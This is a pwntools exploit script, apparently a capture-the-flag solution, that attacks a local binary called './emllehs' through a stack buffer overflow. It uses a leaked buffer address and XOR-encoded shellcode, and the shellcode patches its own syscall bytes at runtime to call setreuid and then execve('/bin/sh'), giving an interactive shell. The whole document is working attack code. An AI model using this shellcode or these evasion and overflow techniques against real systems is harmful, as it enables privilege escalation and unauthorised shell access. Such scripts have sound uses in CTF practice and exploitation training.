from pwn import *

context.update(arch='amd64', os='linux', log_level='info', terminal=['tmux', 'splitw', '-h'])

dd = 0x0f

shellcode = asm("""
        xor rax, rax        
        mov ax, 113        
        mov edi, 1011      
        mov esi, 1011  

        lea r10, [rip + fix_me] 
        incb [r10]
        fix_me:
        .byte 0x0e, 0x05       


        mov rbx, 0x978cd091969dd0d0 
        not rbx
        push rbx
        mov rdi, rsp


        push 59
        pop rax
        mov rsi, 0
        mov rdx, 0


        lea r10, [rip + fix_me2]
        incb [r10]
        fix_me2:
        .byte 0x0e, 0x05   
                """)

p = process('./emllehs')
p.recvuntil(b"at: ")
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked buffer address: {hex(leak)}")

payload = shellcode
payload = payload.ljust(152, b'A')
payload += p64(leak)

encoded_payload = bytes([b if dd^10==b else b^dd for b in payload])

log.info(f"final payload: {encoded_payload.hex}")

p.sendline(encoded_payload)

p.interactive()